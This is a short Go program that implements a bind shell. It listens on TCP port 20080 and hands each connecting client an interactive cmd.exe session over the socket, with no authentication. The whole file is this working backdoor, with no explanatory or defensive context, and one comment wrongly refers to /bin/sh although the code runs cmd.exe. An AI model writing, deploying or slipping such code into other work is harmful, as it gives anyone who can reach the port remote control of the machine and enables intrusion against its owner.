package main

import (
  "net"
  "io"
  "log"
  "os/exec"
)

func handle(conn net.Conn) {

  /* Explicitly calling /bin/sh with and using -i for interactive mode.
     so that we can use it for stdin and stdout.
     For Windows use "cmd.exe". */
     cmd := exec.Command("cmd.exe")
     rp, wp := io.Pipe()
     // Set stdin to our connection.
     cmd.Stdin = conn
     cmd.Stdout = wp
     go io.Copy(conn, rp)
     cmd.Run()
     conn.Close()
}

func main() {
     listener, err := net.Listen("tcp", ":20080")
     if err != nil {
       log.Fatalln(err)
     }
     for {
        conn, err := listener.Accept()
        if err != nil {
          log.Fatalln(err)
        }
       go handle(conn)
     }
}
